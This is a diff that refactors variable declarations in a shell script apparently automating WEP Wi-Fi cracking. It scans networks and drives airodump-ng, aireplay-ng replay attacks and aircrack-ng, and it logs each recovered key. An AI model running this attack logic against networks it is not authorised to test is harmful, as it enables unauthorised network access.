@@ -390,63 +390,82 @@ h_hw_prepare() {
 }
 
 h_csv_get() {
-	local F=$1
-	local bssid=$2
+	local F
+	local bssid
+	F=$1
+	bssid=$2
 	cat $F 2>/dev/null | tail -n +3 | grep "^$bssid,"
 }
 
 h_csv_get_network_iv_count() {
-	local F=$1
-	local bssid=$2
-	local v=$(h_csv_get $F $bssid | awk -F\, '{ print $11; }')
+	local F
+	local bssid
+	local v
+	F=$1
+	bssid=$2
+	v=$(h_csv_get $F $bssid | awk -F\, '{ print $11; }')
 	[ -z "$v" ] && v=0
 	echo $v
 }
 
 h_csv_get_network_sta() {
-	local F=$1
-	local bssid=$2
+	local F
+	local bssid
+	F=$1
+	bssid=$2
 	cat $F 2>/dev/null | grep "^.*,.*,.*,.*,.*, $bssid" | awk -F\, '{ print $1; }'
 }
 
 
 h_kis_get() {
-	local F=$1
+	local F
+	F=$1
 	cat $F 2>/dev/null | tail -n +2 | grep "^.*;infra"
 }
 
 h_kis_get_networks() {
-	local F=$1
+	local F
+	F=$1
 	h_kis_get $F | awk -F\; '{ print $22 "\;" $8 "\;" $1; }' | sort -n -r
 }
 
 h_kis_get_networks_by_enc() {
-	local F=$1
-	local E=$2
+	local F
+	local E
+	F=$1
+	E=$2
 	h_kis_get_networks $F | grep "^.*;$E" | awk -F\; '{ print $3; }'
 }
 
 h_kis_get_network_bssid() {
-	local F=$1
-	local N=$2
+	local F
+	local N
+	F=$1
+	N=$2
 	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $4; }'
 }
 
 h_kis_get_network_channel() {
-	local F=$1
-	local N=$2
+	local F
+	local N
+	F=$1
+	N=$2
 	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $6; }'
 }
 
 h_kis_get_network_essid() {
-	local F=$1
-	local N=$2
+	local F
+	local N
+	F=$1
+	N=$2
 	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $3; }'
 }
 
 h_kis_get_network_max_rate() {
-	local F=$1
-	local N=$2
+	local F
+	local N
+	F=$1
+	N=$2
 	h_kis_get $F | grep "^$N;" | awk -F\; '{ print $10; }' | awk -F. '{ print $1; }'
 }
 
@@ -455,7 +474,8 @@ h_get_last_file() {
 }
 
 h_get_sane_fname() {
-	local F=$1
+	local F
+	F=$1
 	echo $F | tr ':/' '__'
 }
 
@@ -524,12 +544,17 @@ h_replay_stop() {
 
 
 h_capture() {
-	local cmd="airodump-ng $H_MON_IF $*"
+	local cmd
+	cmd="airodump-ng $H_MON_IF $*"
 	h_log "running: $cmd"
 	exec $cmd
 }
 
 h_monitor_all() {
+	local n_open
+	local n_wep
+	local n_wpa
+
 	h_log "monitoring traffic for $H_MONITOR_TIME_LIMIT seconds"
 
 	ifconfig $H_MON_IF down
@@ -556,9 +581,9 @@ h_monitor_all() {
 	h_kis_get_networks_by_enc $H_ALL_KIS_F "WEP" >$H_NET_WEP_F
 	h_kis_get_networks_by_enc $H_ALL_KIS_F "WPA" >$H_NET_WPA_F
 
-	local n_open=$(wc -l <$H_NET_OPEN_F)
-	local n_wep=$(wc -l <$H_NET_WEP_F)
-	local n_wpa=$(wc -l <$H_NET_WPA_F)
+	n_open=$(wc -l <$H_NET_OPEN_F)
+	n_wep=$(wc -l <$H_NET_WEP_F)
+	n_wpa=$(wc -l <$H_NET_WPA_F)
 	h_log "found $n_open open, $n_wep WEP & $n_wpa WPA networks"
 }
 
@@ -568,10 +593,14 @@ h_monitor_all() {
 #
 
 h_open_try_one_network() {
-	local N=$1
-	local bssid=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
-	local channel=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
-	local essid=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
+	local N
+	local bssid
+	local channel
+	local essid
+	N=$1
+	bssid=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
+	channel=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
+	essid=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
 	h_log "found open network: bssid=$bssid, channel=$channel, essid='$essid'"
 }
 
@@ -587,7 +616,8 @@ h_open_try_all_networks() {
 #
 
 h_wep_log_key() {
-	local key=$(cat $H_CUR_KEY_F)
+	local key
+	key=$(cat $H_CUR_KEY_F)
 	h_log "key found: $key"
 	echo "$H_CUR_BSSID,$H_CUR_ESSID,$H_CUR_CHANNEL,$key" >>$H_WEP_F
 	H_WEP_CHANNEL=$H_CUR_CHANNEL
@@ -625,13 +655,15 @@ h_wep_attack_is_working() {
 }
 
 h_wep_attack_try() {
-	local replay_func=$1
+	local replay_func
 	local auth_func
 	local clients
 	local iv
 	local crack_time_started
 	local RC=1
 	
+	replay_func=$1
+
 	h_replay_start $replay_func
 	clients=$(h_csv_get_network_sta $H_CUR_CSV_F $H_CUR_BSSID | grep -iv $H_MON_MAC)
 	if [ -n "$clients" ]; then
@@ -688,13 +720,15 @@ h_wep_attack_try() {
 }
 
 h_wep_crack() {
-	local cmd="aircrack-ng -q -b $H_CUR_BSSID -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
+	local cmd
+	cmd="aircrack-ng -q -b $H_CUR_BSSID -l $H_CUR_KEY_F $H_CUR_BASE_FNAME-??.$H_CUR_CAP_FEXT"
 	h_log "running: $cmd"
 	exec $cmd
 }
 
 h_wep_auth() {
-	local cmd="aireplay-ng $H_MON_IF $*"
+	local cmd
+	cmd="aireplay-ng $H_MON_IF $*"
 	h_log "running: $cmd"
 	exec $cmd
 }
@@ -780,9 +814,10 @@ H_WEP_ATTACKS=" \
 "
 
 h_wep_try_one_network() {
-	local N=$1
+	local N
 	local capture_options
 
+	N=$1
 	H_CUR_BSSID=$(h_kis_get_network_bssid $H_ALL_KIS_F $N)
 	H_CUR_CHANNEL=$(h_kis_get_network_channel $H_ALL_KIS_F $N)
 	H_CUR_ESSID=$(h_kis_get_network_essid $H_ALL_KIS_F $N)
